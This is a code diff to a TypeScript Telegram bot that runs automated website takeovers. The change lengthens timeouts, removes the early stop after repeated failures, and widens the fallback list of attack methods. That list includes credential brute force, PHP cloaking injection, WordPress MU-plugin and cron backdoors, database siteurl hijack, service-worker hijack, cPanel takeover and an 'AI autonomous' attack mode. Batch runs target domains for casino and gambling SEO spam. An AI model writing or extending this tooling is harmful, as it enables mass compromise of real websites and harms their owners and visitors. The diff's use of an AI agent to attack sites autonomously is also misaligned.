@@ -174,7 +174,7 @@ const recentCompletedAttacks: Array<{
   completedAt: number;
 }> = [];
 const MAX_RECENT_COMPLETED = 20;
-const ATTACK_TIMEOUT_MS = 30 * 60 * 1000; // 30 minutes — ให้เวลาเพียงพอสำหรับรันทุกระบบครบ (Shodan + LeakCheck + FTP + SSH + cPanel + WP + all methods)
+const ATTACK_TIMEOUT_MS = 60 * 60 * 1000; // 60 minutes — ให้เวลาเพียงพอสำหรับรันทุกวิธีครบทุก 16+ วิธี (Shodan + LeakCheck + FTP + SSH + cPanel + WP + all methods)
 
 function registerRunningAttack(domain: string, method: string, chatId: number, progressMsgId: number): RunningAttack {
   const id = `${domain}:${method}:${Date.now()}`;
@@ -5425,7 +5425,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       
       // Track last scan stage to avoid duplicate updates
       let lastScanStage = "";
-      const VULN_SCAN_TIMEOUT = 120_000; // 120s timeout for vuln scan in full_chain (increased from 90s to reduce timeout frequency)
+      const VULN_SCAN_TIMEOUT = 180_000; // 180s timeout for vuln scan (increased from 120s — WAF-protected sites need more time)
       
       try {
         // Wrap fullVulnScan with timeout to prevent pipeline hang
@@ -5694,28 +5694,41 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
           }).join("\n")
         );
       } else {
-        // Fallback: NO scan data — use smart priority order (not all 20+ methods)
-        // When scan fails, we have no intel → only try high-value universal methods first
-        const PRIORITY_METHODS_NO_SCAN = [
-          "pipeline",       // Unified Pipeline — best general-purpose method
-          "redirect",       // Redirect Takeover — works on any CMS
-          "hijack",         // Credential hunt + hijack — universal
-          "cloaking",       // PHP injection — common on WP
-          "auto_prepend",   // .user.ini — works on any PHP site
-          "agentic_auto",   // AI autonomous — last resort, most adaptive
-          "open_redirect",  // Open redirect chain — universal
+        // Fallback: NO scan data — use ALL compatible methods in smart priority order
+        // Priority: high-value universal methods first, then WP-specific, then CMS-specific
+        const PRIORITY_ORDER_NO_SCAN = [
+          "pipeline",       // 1. Unified Pipeline — best general-purpose method
+          "redirect",       // 2. Redirect Takeover — works on any CMS
+          "hijack",         // 3. Credential hunt + hijack — universal
+          "cloaking",       // 4. PHP injection — common on WP
+          "mu_plugins",     // 5. MU-Plugins backdoor — WP stealth
+          "auto_prepend",   // 6. .user.ini — works on any PHP site
+          "db_siteurl",     // 7. DB siteurl hijack — WP database
+          "gtm_inject",     // 8. GTM redirect inject — WP header/footer
+          "advanced",       // 9. Advanced deploy (5 techniques) — WP
+          "wp_cron",        // 10. WP-Cron backdoor — persistent
+          "widget_inject",  // 11. Widget/Sidebar inject — WP
+          "wpcode_abuse",   // 12. WPCode plugin abuse — WP
+          "cpanel_full",    // 13. cPanel full control — universal
+          "service_worker", // 14. Service worker hijack — universal
+          "open_redirect",  // 15. Open redirect chain — universal
+          "laravel_inject", // 16. Laravel inject — if detected
+          "joomla",         // 17. Joomla exploits — if detected
+          "drupal",         // 18. Drupal exploits — if detected
+          "iis_aspnet",     // 19. IIS/ASP.NET — if detected
+          "agentic_auto",   // 20. AI autonomous — LAST RESORT (most adaptive but heavy)
         ];
         
-        // Use priority order, but only include methods that are in compatibleMethods
-        const priorityIds = PRIORITY_METHODS_NO_SCAN.filter(id => compatibleMethods.some(m => m.id === id));
-        // Add remaining compatible methods after priority ones (in case user wants to try more)
+        // Use priority order, include ALL compatible methods
+        const priorityIds = PRIORITY_ORDER_NO_SCAN.filter(id => compatibleMethods.some(m => m.id === id));
+        // Add any remaining compatible methods not in priority list
         const remainingIds = compatibleMethods.map(m => m.id).filter(id => !priorityIds.includes(id));
         methodOrder = [...priorityIds, ...remainingIds];
         
-        const skippedCount = remainingIds.length;
         await narrator.addAnalysis(
-          `\u26A0\uFE0F \u0E44\u0E21\u0E48\u0E21\u0E35\u0E02\u0E49\u0E2D\u0E21\u0E39\u0E25 scan \u2014 \u0E43\u0E0A\u0E49\u0E25\u0E33\u0E14\u0E31\u0E1A\u0E40\u0E23\u0E34\u0E48\u0E21\u0E15\u0E49\u0E19 (${priorityIds.length} \u0E27\u0E34\u0E18\u0E35\u0E2B\u0E25\u0E31\u0E01 + ${skippedCount} \u0E2A\u0E33\u0E23\u0E2D\u0E07)\n` +
-          `\uD83C\uDFAF Priority: ${priorityIds.map((id, i) => `${i + 1}. ${compatibleMethods.find(m => m.id === id)?.name || id}`).join(", ")}`
+          `⚠️ ไม่มีข้อมูล scan — ใช้ทุกวิธีที่เข้ากันได้ (${methodOrder.length} วิธี)\n` +
+          `🎯 ลำดับ: ${methodOrder.slice(0, 8).map((id, i) => `${i + 1}. ${compatibleMethods.find(m => m.id === id)?.name || id}`).join(", ")}` +
+          (methodOrder.length > 8 ? `\n... +${methodOrder.length - 8} วิธีเพิ่มเติม` : "")
         );
       }
       
@@ -5788,27 +5801,32 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       // Set totalMethods for progress counter display
       (narrator as any).config.totalMethods = methodOrder.length;
       
-      // Per-method timeout settings (ms)
-      // ═══ PER-METHOD TIMEOUTS ═══
-      // Each method gets a strict time budget. If it exceeds this, it's killed and we move to the next.
-      // Key principle: NO single method should consume >15% of the loop time.
+      // ═══ PER-METHOD TIMEOUTS (GENEROUS) ═══
+      // Each method gets a generous time budget. If it exceeds this, it's killed and we move to the next.
+      // With 50-min method loop and 60-min total, we can afford 5 min per method
+      // 16 methods x 5 min = 80 min max, but most finish in 1-2 min
       const METHOD_TIMEOUTS: Record<string, number> = {
-        pipeline: 3 * 60 * 1000,       // 3 min — pipeline (reduced from 12: must be fast, other methods need time)
-        agentic_auto: 3 * 60 * 1000,   // 3 min — AI session (reduced from 8: quick attempt then move on)
-        hijack: 3 * 60 * 1000,         // 3 min — credential hunt + methods (reduced from 5)
-        advanced: 3 * 60 * 1000,       // 3 min — advanced techniques (reduced from 5)
-        cloaking: 2 * 60 * 1000,       // 2 min
-        redirect: 90 * 1000,           // 1.5 min
+        pipeline: 5 * 60 * 1000,       // 5 min — unified pipeline (most comprehensive)
+        agentic_auto: 8 * 60 * 1000,   // 8 min — AI autonomous session (needs time to think + act)
+        hijack: 5 * 60 * 1000,         // 5 min — credential hunt + brute force
+        advanced: 5 * 60 * 1000,       // 5 min — advanced techniques (5 sub-techniques)
+        cloaking: 4 * 60 * 1000,       // 4 min — PHP cloaking injection
+        cpanel_full: 5 * 60 * 1000,    // 5 min — cPanel full control (many sub-steps)
+        redirect: 3 * 60 * 1000,       // 3 min — redirect takeover
+        mu_plugins: 3 * 60 * 1000,     // 3 min — MU-plugins backdoor
+        db_siteurl: 3 * 60 * 1000,     // 3 min — DB siteurl hijack
+        auto_prepend: 3 * 60 * 1000,   // 3 min — .user.ini auto_prepend
+        open_redirect: 3 * 60 * 1000,  // 3 min — open redirect chain
       };
-      const DEFAULT_METHOD_TIMEOUT = 2 * 60 * 1000; // 2 min default
-      const MAX_CONSECUTIVE_FAILURES = 15; // Stop after 15 consecutive failures (run ALL systems before giving up)
+      const DEFAULT_METHOD_TIMEOUT = 3 * 60 * 1000; // 3 min default (was 2 min)
+      const MAX_CONSECUTIVE_FAILURES = 50; // NEVER stop early — run ALL methods regardless of failures
       
       // ═══ GLOBAL METHOD LOOP TIMEOUT (20 min) ═══
       console.log(`[TelegramAI] full_chain PHASE 2: Starting method loop with ${methodOrder.length} methods for ${domain}`);
       // Graceful shutdown: when this deadline is reached, stop trying new methods and send summary
-      // Increased from 8 min to 20 min to allow all 20 methods to run (each ~3 min max)
-      // This is separate from ATTACK_TIMEOUT_MS (30 min) which covers the entire attack including vuln scan + verify
-      const FULL_CHAIN_METHOD_LOOP_TIMEOUT_MS = 20 * 60 * 1000; // 20 minutes for all method attempts
+      // Increased to 50 min to allow ALL 16+ methods to run fully (each ~3-5 min)
+      // This is separate from ATTACK_TIMEOUT_MS (60 min) which covers the entire attack including vuln scan + verify
+      const FULL_CHAIN_METHOD_LOOP_TIMEOUT_MS = 50 * 60 * 1000; // 50 minutes for all method attempts
       const methodLoopDeadline = Date.now() + FULL_CHAIN_METHOD_LOOP_TIMEOUT_MS;
       
       // Helper: run with per-method timeout + abort signal
@@ -5955,7 +5973,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
                 enableComprehensiveAttacks: true,
                 enablePostUpload: true,
                 userId: 1,
-                globalTimeout: 3 * 60 * 1000, // 3 min — match per-method timeout (was 15 min, caused 1/20 hang)
+                globalTimeout: 5 * 60 * 1000, // 5 min — match per-method timeout (generous for WAF-protected sites)
               },
               async (event) => {
                 const elapsed = Math.round((Date.now() - methodStart) / 1000);
@@ -9649,7 +9667,7 @@ async function executeBatchAttackWithProgress(
       maxConcurrent,
       maxRetries: 2,
       seoKeywords: ["casino", "gambling", "slots"],
-      globalTimeoutPerDomain: 30 * 60 * 1000, // 30 min per domain
+      globalTimeoutPerDomain: 60 * 60 * 1000, // 60 min per domain (match ATTACK_TIMEOUT_MS)
 
       onProgress: async (status) => {
         // Throttle progress updates
